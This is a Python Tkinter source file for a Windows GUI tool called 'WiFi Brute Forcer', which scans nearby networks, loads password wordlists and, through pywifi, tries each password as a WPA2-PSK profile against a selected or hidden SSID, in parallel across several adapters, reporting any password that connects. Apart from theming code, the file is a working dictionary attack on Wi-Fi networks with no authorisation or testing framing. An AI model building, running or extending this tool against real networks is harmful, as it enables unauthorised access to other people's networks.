import threading
import time
import tkinter as tk
from tkinter import filedialog, messagebox
import sys
import os

# Ensure the script's directory is in the Python path
script_dir = os.path.dirname(os.path.abspath(__file__))
if script_dir not in sys.path:
    sys.path.insert(0, script_dir)

try:
    import pywifi
    from pywifi import const
except ImportError:
    raise ImportError("pywifi is required on Windows. Install with 'pip install pywifi'")

try:
    # Attempting relative import
    from . import themes
except ImportError: # Catch ImportError which can occur if not run as a package
    try:
        import themes # Fallback to direct import
    except ModuleNotFoundError: # This is now the primary catch if 'themes' is not found directly
        # Provide a more specific error message if it still fails
        print(f"Failed to import 'themes.py'. Ensure it's in the same directory: {script_dir}")
        print(f"Current sys.path: {sys.path}")
        raise
# The following 'except ModuleNotFoundError' was redundant because the preceding 'except ImportError'
# would have already caught 'ModuleNotFoundError' (as it's a subclass).
# The logic has been consolidated into the 'except ImportError' block above.


class WifiBruteForcer:
    def __init__(self, master):
        self.master = master
        master.title("WiFi Brute Forcer (Windows)")
        master.geometry("550x580") # Adjusted for theme selector & padding

        self.current_theme_name = themes.get_season()
        if self.current_theme_name not in themes.THEMES:
            self.current_theme_name = "dark" # Fallback
        themes.set_current_theme_name(self.current_theme_name)

        # --- Theme Selector ---
        self.theme_frame = tk.Frame(master)
        self.theme_label = tk.Label(self.theme_frame, text="Theme:")
        self.theme_label.pack(side=tk.LEFT, padx=5)
        self.theme_var = tk.StringVar(master)
        self.theme_var.set(self.current_theme_name.capitalize())
        theme_options = [name.capitalize() for name in themes.THEMES.keys()]
        self.theme_menu = tk.OptionMenu(self.theme_frame, self.theme_var, *theme_options, command=self.change_theme)
        self.theme_menu.pack(side=tk.LEFT)
        self.theme_frame.pack(pady=10, padx=10, anchor='w')

        # Hidden SSID toggle
        self.hidden_var = tk.BooleanVar()
        self.hidden_frame = tk.Frame(master)
        self.hidden_checkbutton = tk.Checkbutton(self.hidden_frame, text="Hidden SSID", variable=self.hidden_var,
                                                 command=self._toggle_hidden)
        self.hidden_checkbutton.pack(side=tk.LEFT)
        self.manual_ssid_label = tk.Label(self.hidden_frame, text="Manual SSID:")
        self.manual_ssid_label.pack(side=tk.LEFT, padx=(10,0))
        self.ssid_entry = tk.Entry(self.hidden_frame, width=30, state=tk.DISABLED)
        self.ssid_entry.pack(side=tk.LEFT, padx=5)
        self.hidden_frame.pack(pady=5, padx=10, fill=tk.X)

        # Initialize wifi FIRST, so self.iface is available for scan_btn state
        self.wifi = pywifi.PyWiFi()
        self.iface = None # Initialize iface to None
        self.all_interfaces = []
        try:
            self.all_interfaces = self.wifi.interfaces()
            if not self.all_interfaces:
                messagebox.showerror("Error", "No Wi-Fi interfaces found. Cracking and scanning functionality will be limited.")
            else:
                self.iface = self.all_interfaces[0] # Default to the first interface
        except Exception as e:
            messagebox.showerror("Error", f"Failed to initialize Wi-Fi interfaces: {e}")
            # self.all_interfaces is already [], self.iface is already None

        # Scan and list
        self.scan_btn = tk.Button(master, text="Scan Networks", command=self.scan_networks)
        self.scan_btn.pack(pady=5)
        self.scan_btn.bind("<ButtonPress-1>", self._on_button_press)
        self.scan_btn.bind("<ButtonRelease-1>", self._on_button_release)
        if not self.iface: # Disable scan button if no interface is available
            self.scan_btn.config(state=tk.DISABLED)


        self.network_listbox = tk.Listbox(master, selectmode=tk.SINGLE, width=60, height=8)
        self.network_listbox.pack(pady=5, padx=10, fill=tk.X, expand=True)

        # Dictionary load
        self.load_dict_btn = tk.Button(master, text="Load Dictionary", command=self.load_dictionary)
        self.load_dict_btn.pack(pady=5)
        self.load_dict_btn.bind("<ButtonPress-1>", self._on_button_press)
        self.load_dict_btn.bind("<ButtonRelease-1>", self._on_button_release)

        self.dict_label = tk.Label(master, text="No dictionary loaded")
        self.dict_label.pack(pady=5)

        # Start button
        self.start_btn = tk.Button(master, text="Start Brute Force", command=self.start_bruteforce)
        self.start_btn.pack(pady=10)
        self.start_btn.bind("<ButtonPress-1>", self._on_button_press)
        self.start_btn.bind("<ButtonRelease-1>", self._on_button_release)

        # Status label
        self.status_label = tk.Label(master, text="Status: Idle")
        self.status_label.pack(pady=10)

        # --- Adapter Selection Frame ---
        self.adapter_frame = tk.Frame(master)
        self.adapter_frame.pack(pady=5, padx=10, fill=tk.X)

        self.adapter_label = tk.Label(self.adapter_frame, text="Select Adapter(s):")
        self.adapter_label.pack(side=tk.LEFT, padx=(0, 5))

        self.adapter_listbox = tk.Listbox(self.adapter_frame, selectmode=tk.EXTENDED, width=50, height=3)
        if self.all_interfaces:
            for iface_obj in self.all_interfaces: # Renamed to avoid conflict
                self.adapter_listbox.insert(tk.END, iface_obj.name())
            if self.all_interfaces: # Select the first interface by default
                self.adapter_listbox.selection_set(0)
        else:
            self.adapter_listbox.insert(tk.END, "No interfaces found")
            self.adapter_listbox.config(state=tk.DISABLED)
        self.adapter_listbox.pack(side=tk.LEFT, fill=tk.X, expand=True)

        # --- Mode Selection Frame ---
        self.mode_selection_frame = tk.Frame(master)
        self.mode_selection_frame.pack(pady=5, padx=10, fill=tk.X)

        self.adapter_mode_var = tk.StringVar(value="Single Adapter Mode")
        self.single_adapter_radio = tk.Radiobutton(
            self.mode_selection_frame, text="Single Adapter Mode",
            variable=self.adapter_mode_var, value="Single Adapter Mode",
            command=self._on_adapter_mode_change
        )
        self.single_adapter_radio.pack(side=tk.LEFT, padx=(0, 10))

        self.multi_adapter_radio = tk.Radiobutton(
            self.mode_selection_frame, text="Multiple Adapters Mode",
            variable=self.adapter_mode_var, value="Multiple Adapters Mode",
            command=self._on_adapter_mode_change
        )
        self.multi_adapter_radio.pack(side=tk.LEFT)

        # --- Secondary Dictionary Frame ---
        self.secondary_dict_frame = tk.Frame(master)
        # Packed later by _on_adapter_mode_change

        self.load_secondary_dict_btn = tk.Button(
            self.secondary_dict_frame, text="Load Secondary Dictionary",
            command=self.load_secondary_dictionary
        )
        self.load_secondary_dict_btn.pack(side=tk.LEFT, pady=5)
        self.load_secondary_dict_btn.bind("<ButtonPress-1>", self._on_button_press)
        self.load_secondary_dict_btn.bind("<ButtonRelease-1>", self._on_button_release)

        self.secondary_dict_label = tk.Label(self.secondary_dict_frame, text="No secondary dictionary loaded")
        self.secondary_dict_label.pack(side=tk.LEFT, pady=5, padx=5)

        self.networks = []
        self.dictionary = []
        self.secondary_dictionary = []
        self.secondary_dict_path = ""


        self.apply_current_theme() # Apply theme after all widgets are created
        self._on_adapter_mode_change() # Call once to set initial state of UI elements

    def _on_button_press(self, event):
        widget = event.widget
        if widget.cget('state') == tk.DISABLED:
            return
        current_palette = themes.get_current_theme()
        # Define fallbacks directly here
        default_btn_active_bg = "#555555"
        default_fg_color = "#FFFFFF"

        widget.config(
            relief=tk.SUNKEN,
            bg=current_palette.get("btn_active_bg", default_btn_active_bg),
            fg=current_palette.get("fg_color", default_fg_color)
        )

    def _on_button_release(self, event):
        widget = event.widget
        if widget.cget('state') == tk.DISABLED:
            self.apply_current_theme()
            return

        current_palette = themes.get_current_theme()
        # themes.apply_theme_to_widget is expected to handle fallbacks if necessary
        themes.apply_theme_to_widget(widget, current_palette)


    def change_theme(self, selected_theme_capitalized):
        new_theme_name = selected_theme_capitalized.lower()
        themes.set_current_theme_name(new_theme_name)
        self.current_theme_name = new_theme_name
        self.apply_current_theme()

    def apply_current_theme(self):
        current_palette = themes.get_current_theme()
        # Default colors, chosen to be generally visible if a theme key is missing.
        default_bg = "#2e2e2e"
        default_fg = "#ffffff"
        default_btn_bg = "#4e4e4e"
        default_btn_active_bg = "#5e5e5e"
        default_entry_bg = "#3e3e3e"
        default_select_bg = "#0078d7"
        default_listbox_bg = "#3e3e3e"

        self.master.configure(bg=current_palette.get("bg_color", default_bg))

        themes.apply_recursively(self.master, current_palette, default_palette={
            "bg_color": default_bg, "fg_color": default_fg, "btn_bg": default_btn_bg,
            "btn_active_bg": default_btn_active_bg, "entry_bg": default_entry_bg,
            "select_bg": default_select_bg, "listbox_bg": default_listbox_bg
        })


        if hasattr(self, 'theme_menu'):
            self.theme_menu.config(
                bg=current_palette.get("btn_bg", default_btn_bg),
                fg=current_palette.get("fg_color", default_fg),
                activebackground=current_palette.get("btn_active_bg", default_btn_active_bg),
                highlightthickness=0
            )
            menu_widget_name = self.theme_menu.menuname
            try:
                menu = self.theme_menu.nametowidget(menu_widget_name)
                menu.config(
                    bg=current_palette.get("entry_bg", default_entry_bg),
                    fg=current_palette.get("fg_color", default_fg),
                    activebackground=current_palette.get("select_bg", default_select_bg),
                    activeforeground=current_palette.get("fg_color", default_fg),
                    relief=tk.FLAT
                )
            except tk.TclError:
                pass

        self._update_widget_states_for_theme()

        if hasattr(self, 'network_listbox') and self.network_listbox.size() > 0:
            for i in range(self.network_listbox.size()):
                current_item_fg = self.network_listbox.itemcget(i, "fg")
                current_item_bg = self.network_listbox.itemcget(i, "background")
                is_hidden_for_animation = (str(current_item_fg) == str(current_item_bg)) and \
                                          (current_item_bg != "" and current_item_bg is not None)


                if not is_hidden_for_animation:
                    self.network_listbox.itemconfig(i, {
                        'bg': current_palette.get("listbox_bg", default_listbox_bg),
                        'fg': current_palette.get("fg_color", default_fg),
                        'selectbackground': current_palette.get("select_bg", default_select_bg),
                        'selectforeground': current_palette.get("fg_color", default_fg)
                    })

    def _update_widget_states_for_theme(self):
        current_palette = themes.get_current_theme()
        default_entry_bg = "#3e3e3e"
        default_fg = "#ffffff"
        default_listbox_bg = "#3e3e3e"
        default_select_bg = "#0078d7"
        default_disabled_fg = "#a0a0a0" # A dimmer foreground for disabled text

        # SSID Entry
        entry_bg_val = current_palette.get("entry_bg", default_entry_bg)
        fg_val = current_palette.get("fg_color", default_fg)
        disabled_fg_val = current_palette.get("disabled_fg_color", default_disabled_fg)

        if self.ssid_entry.cget('state') == tk.DISABLED:
            self.ssid_entry.config(
                disabledbackground=current_palette.get("entry_bg_disabled", entry_bg_val), # specific or fallback
                disabledforeground=disabled_fg_val
            )
        else: # NORMAL
            self.ssid_entry.config(
                bg=entry_bg_val,
                fg=fg_val,
                insertbackground=current_palette.get("insert_bg_color", fg_val) # Cursor color
            )

        for listbox_widget in [self.network_listbox, self.adapter_listbox]:
            is_disabled = listbox_widget.cget('state') == tk.DISABLED

            listbox_bg_to_use = current_palette.get("listbox_bg", default_listbox_bg)
            fg_to_use = current_palette.get("fg_color", default_fg)
            select_bg_to_use = current_palette.get("select_bg", default_select_bg)

            final_fg_to_use = disabled_fg_val if is_disabled else fg_to_use
            final_select_bg = listbox_bg_to_use if is_disabled else select_bg_to_use
            final_select_fg = disabled_fg_val if is_disabled else fg_to_use


            listbox_widget.config(
                bg=listbox_bg_to_use,
                fg=final_fg_to_use,
                selectbackground=final_select_bg,
                selectforeground=final_select_fg,
                highlightthickness=0, # Common for themed listboxes
                borderwidth=0 # Common for themed listboxes
            )

    def _toggle_hidden(self):
        is_hidden = self.hidden_var.get()
        new_ssid_state = tk.NORMAL if is_hidden else tk.DISABLED
        new_scan_btn_state = tk.DISABLED if is_hidden else tk.NORMAL

        self.ssid_entry.config(state=new_ssid_state)
        # Only enable scan_btn if an interface exists
        if self.iface:
            self.scan_btn.config(state=new_scan_btn_state)
        else:
            self.scan_btn.config(state=tk.DISABLED) # Keep disabled if no iface

        if not is_hidden:
            self.ssid_entry.delete(0, tk.END)

        self.apply_current_theme()

    def scan_networks(self):
        self.network_listbox.delete(0, tk.END)
        self.status_label.config(text="Status: Scanning...")
        current_palette = themes.get_current_theme()
        default_fg = "#ffffff"
        default_listbox_bg = "#3e3e3e"

        if hasattr(self, 'current_theme_name'):
             themes.apply_theme_to_widget(self.status_label, current_palette)

        if not self.iface:
            messagebox.showerror("Error", "No Wi-Fi interface available for scanning.")
            self.status_label.config(text="Status: Error - No Wi-Fi adapter")
            if hasattr(self, 'current_theme_name'):
                 themes.apply_theme_to_widget(self.status_label, current_palette)
            return

        try:
            self.iface.scan()
            time.sleep(2)
            results = self.iface.scan_results()
            ssids = sorted({net.ssid for net in results if net.ssid})
            self.networks = ssids

            # Use palette.get with fallbacks for initial item configuration
            initial_item_bg = current_palette.get("listbox_bg", default_listbox_bg)
            # For initially "hidden" items, fg should be same as bg
            initial_item_fg = initial_item_bg

            if not ssids:
                self.status_label.config(text="Status: No networks found")
            else:
                self.status_label.config(text=f"Status: Found {len(ssids)} networks, populating...")

                for i, ssid in enumerate(ssids):
                    self.network_listbox.insert(tk.END, ssid)
                    self.network_listbox.itemconfig(tk.END, {
                        'bg': initial_item_bg,
                        'fg': initial_item_fg
                    })

                    self.master.after(
                        50 * (i + 1),
                        lambda index=i, item_ssid=ssid: self._animate_list_item_in(index, item_ssid)
                    )
        except Exception as e:
            messagebox.showerror("Error", f"Failed to scan: {e}")
            self.status_label.config(text="Status: Error scanning")
        finally:
            if hasattr(self, 'current_theme_name'):
                 themes.apply_theme_to_widget(self.status_label, current_palette)

    def _on_adapter_mode_change(self):
        mode = self.adapter_mode_var.get()
        self.adapter_listbox.selection_clear(0, tk.END)

        if mode == "Single Adapter Mode":
            self.adapter_listbox.config(selectmode=tk.SINGLE)
            self.secondary_dict_frame.pack_forget()
            if self.all_interfaces:
                self.adapter_listbox.selection_set(0)
        elif mode == "Multiple Adapters Mode":
            self.adapter_listbox.config(selectmode=tk.EXTENDED)
            self.secondary_dict_frame.pack(pady=5, padx=10, fill=tk.X, before=self.scan_btn)
            if self.all_interfaces:
                self.adapter_listbox.selection_set(0)

        if hasattr(self, 'current_theme_name'):
            self.apply_current_theme()


    def load_secondary_dictionary(self):
        path = filedialog.askopenfilename(title="Select secondary dictionary file",
                                          filetypes=(("Text files", "*.txt"), ("All files", "*.*")))
        if path:
            with open(path, 'r', encoding='utf-8', errors='ignore') as f:
                self.secondary_dictionary = [line.strip() for line in f if line.strip()]
            self.secondary_dict_path = path
            self.secondary_dict_label.config(text=f"Sec. Dictionary: {os.path.basename(path)} ({len(self.secondary_dictionary)} entries)")
            if hasattr(self, 'current_theme_name'):
                 themes.apply_theme_to_widget(self.secondary_dict_label, themes.get_current_theme())
                 themes.apply_theme_to_widget(self.load_secondary_dict_btn, themes.get_current_theme())


    def _animate_list_item_in(self, index, ssid_text):
        try:
            current_palette = themes.get_current_theme()
            default_listbox_bg = current_palette.get("listbox_bg", "#3e3e3e") # Use theme's or hardcoded
            default_fg = current_palette.get("fg_color", "#ffffff")           # Use theme's or hardcoded
            default_select_bg = current_palette.get("select_bg", "#0078d7")   # Use theme's or hardcoded
            default_select_fg = current_palette.get("select_fg_color", default_fg) # Use specific or general fg

            # Check if the item still exists and matches the expected SSID
            if index < self.network_listbox.size() and self.network_listbox.get(index) == ssid_text:
                 self.network_listbox.itemconfig(
                    index,
                    {
                        'bg': default_listbox_bg,
                        'fg': default_fg,
                        'selectbackground': default_select_bg,
                        'selectforeground': default_select_fg
                    }
                )
        except tk.TclError:
            pass # Item might have been deleted before animation or other Tcl error


    def load_dictionary(self):
        path = filedialog.askopenfilename(title="Select dictionary file",
                                          filetypes=(("Text files", "*.txt"), ("All files", "*.*")))
        if path:
            with open(path, 'r', encoding='utf-8', errors='ignore') as f:
                self.dictionary = [line.strip() for line in f if line.strip()]
            self.dict_label.config(text=f"Dictionary: {os.path.basename(path)} ({len(self.dictionary)} entries)")
            if hasattr(self, 'current_theme_name'):
                 themes.apply_theme_to_widget(self.dict_label, themes.get_current_theme())


    def start_bruteforce(self):
        target_ssid = "" # Initialize target_ssid
        if self.hidden_var.get():
            target_ssid = self.ssid_entry.get().strip()
            if not target_ssid: # Use target_ssid for check
                messagebox.showwarning("Warning", "Enter the hidden SSID first.")
                return
        else:
            sel = self.network_listbox.curselection()
            if not sel:
                messagebox.showwarning("Warning", "Please select a network to attack.")
                return
            target_ssid = self.networks[sel[0]] # Use target_ssid

        # Check primary dictionary first
        if not self.dictionary:
            messagebox.showwarning("Warning", "Please load a primary password dictionary.")
            return

        selected_adapter_indices = self.adapter_listbox.curselection()
        if not selected_adapter_indices:
            messagebox.showwarning("Warning", "Please select at least one adapter.")
            return
        selected_interfaces = [self.all_interfaces[i] for i in selected_adapter_indices]

        current_mode = self.adapter_mode_var.get()
        chosen_dictionary = self.dictionary # Default to primary
        dict_source_name = "primary"

        if current_mode == "Multiple Adapters Mode":
            if self.secondary_dictionary: # If secondary is loaded, use it
                chosen_dictionary = self.secondary_dictionary
                dict_source_name = "secondary"
            # If secondary is not loaded in multi-adapter mode, it will still use primary (as per above default)
            # We need to ensure a dictionary is chosen.
            if not chosen_dictionary: # This case should not be hit if primary is always loaded first.
                 messagebox.showwarning("Warning", f"Please load the {dict_source_name} password dictionary for Multiple Adapter Mode.")
                 return


        if not chosen_dictionary: # General check if no dictionary ended up being selected
            messagebox.showwarning("Warning", "No password dictionary is available for the current mode.")
            return

        interfaces_to_use_arg = [] # Initialize correctly for type hint
        if current_mode == "Single Adapter Mode":
            if len(selected_interfaces) > 1:
                messagebox.showwarning("Warning", "Single Adapter Mode: Please select only one adapter.")
                return
            if not selected_interfaces: # Should be caught earlier, but good for robustness
                messagebox.showwarning("Warning", "Single Adapter Mode: No adapter selected.")
                return
            interfaces_to_use_arg = selected_interfaces[0]
        else: # Multiple Adapters Mode
            if not selected_interfaces:
                 messagebox.showwarning("Warning", "Multiple Adapter Mode: Please select adapter(s).")
                 return
            interfaces_to_use_arg = selected_interfaces

        t = threading.Thread(target=self.bruteforce, args=(target_ssid, self.hidden_var.get(), interfaces_to_use_arg, chosen_dictionary))
        t.daemon = True
        t.start()

    def _try_passwords_on_adapter(self, adapter_iface, ssid, hidden, dictionary_to_use, password_found_event):
        adapter_name = adapter_iface.name()
        self.master.after(0, lambda: self.status_label.config(text=f"Adapter '{adapter_name}': Starting attack on {ssid}"))
        if hasattr(self, 'current_theme_name'):
            self.master.after(0, lambda: themes.apply_theme_to_widget(self.status_label, themes.get_current_theme()))

        for pwd_idx, pwd in enumerate(dictionary_to_use):
            if password_found_event.is_set():
                self.master.after(0, lambda: self.status_label.config(text=f"Adapter '{adapter_name}': Stopping, password found by another adapter."))
                if hasattr(self, 'current_theme_name'):
                    self.master.after(0, lambda: themes.apply_theme_to_widget(self.status_label, themes.get_current_theme()))
                return

            self.master.after(0, lambda current_pwd=pwd: self.status_label.config(text=f"Adapter '{adapter_name}': Trying {current_pwd}"))
            if hasattr(self, 'current_theme_name'):
                 self.master.after(0, lambda: themes.apply_theme_to_widget(self.status_label, themes.get_current_theme()))

            profile = pywifi.Profile()
            profile.ssid = ssid
            profile.auth = const.AUTH_ALG_OPEN
            profile.akm.append(const.AKM_TYPE_WPA2PSK)
            profile.cipher = const.CIPHER_TYPE_CCMP
            profile.key = pwd
            if hidden:
                try:
                    # This is the line Pylance flags. pywifi might add this attribute dynamically
                    # or it's specific to certain OS/drivers. The try/except is the correct way to handle it.
                    setattr(profile, 'hidden', True)
                except AttributeError:
                    # If 'hidden' attribute doesn't exist, we can't set it.
                    # This is expected for some pywifi versions/setups.
                    pass

            adapter_iface.remove_all_network_profiles()
            tmp_profile = adapter_iface.add_network_profile(profile)
            adapter_iface.connect(tmp_profile)

            connect_time = 0
            max_connect_time = 5
            while connect_time < max_connect_time:
                if adapter_iface.status() == const.IFACE_CONNECTED:
                    break
                if password_found_event.is_set():
                    adapter_iface.disconnect()
                    return
                time.sleep(0.5)
                connect_time += 0.5

            if adapter_iface.status() == const.IFACE_CONNECTED:
                password_found_event.set()
                success_msg = f"Connected on '{adapter_name}'!\nSSID: {ssid}\nPassword: {pwd}"
                self.master.after(0, lambda m=success_msg: messagebox.showinfo("Success", m))
                self.master.after(0, lambda: self.status_label.config(text=f"Success on '{adapter_name}'! Pass: {pwd}"))
                if hasattr(self, 'current_theme_name'):
                    self.master.after(0, lambda: themes.apply_theme_to_widget(self.status_label, themes.get_current_theme()))
                return
            else:
                adapter_iface.disconnect()
                time.sleep(0.1)

        if not password_found_event.is_set():
            self.master.after(0, lambda: self.status_label.config(text=f"Adapter '{adapter_name}': Finished, no password found."))
            if hasattr(self, 'current_theme_name'):
                self.master.after(0, lambda: themes.apply_theme_to_widget(self.status_label, themes.get_current_theme()))


    def bruteforce(self, ssid, hidden, interfaces_to_use, current_dictionary):
        self.status_label.config(text=f"Status: Attacking {ssid}...")
        if hasattr(self, 'current_theme_name'):
             themes.apply_theme_to_widget(self.status_label, themes.get_current_theme())

        self.password_found_event = threading.Event()
        threads = []

        # Ensure interfaces_to_use is always a list for iteration, even if it's a single interface object
        if not isinstance(interfaces_to_use, list):
            interfaces_to_use_list = [interfaces_to_use]
        else:
            interfaces_to_use_list = interfaces_to_use


        if not interfaces_to_use_list: # Check the list
            messagebox.showerror("Error", "No interfaces selected for bruteforce.")
            self.status_label.config(text="Status: Error - No interfaces")
            if hasattr(self, 'current_theme_name'):
                themes.apply_theme_to_widget(self.status_label, themes.get_current_theme())
            return

        for iface_obj in interfaces_to_use_list: # Iterate over the list
            thread = threading.Thread(target=self._try_passwords_on_adapter,
                                      args=(iface_obj, ssid, hidden, current_dictionary, self.password_found_event))
            thread.daemon = True
            threads.append(thread)
            thread.start()

        for thread in threads:
            thread.join()

        if self.password_found_event.is_set():
            self.master.after(0, lambda: self.status_label.config(text="Status: Password Found!"))
        else:
            self.master.after(0, lambda: messagebox.showinfo("Finished", f"Brute force complete for {ssid}, no password found with selected adapter(s)."))
            self.master.after(0, lambda: self.status_label.config(text="Status: Finished - No password found"))

        if hasattr(self, 'current_theme_name'):
            self.master.after(0, lambda: themes.apply_theme_to_widget(self.status_label, themes.get_current_theme()))


if __name__ == "__main__":
    root = tk.Tk()
    app = WifiBruteForcer(root)
    root.mainloop()
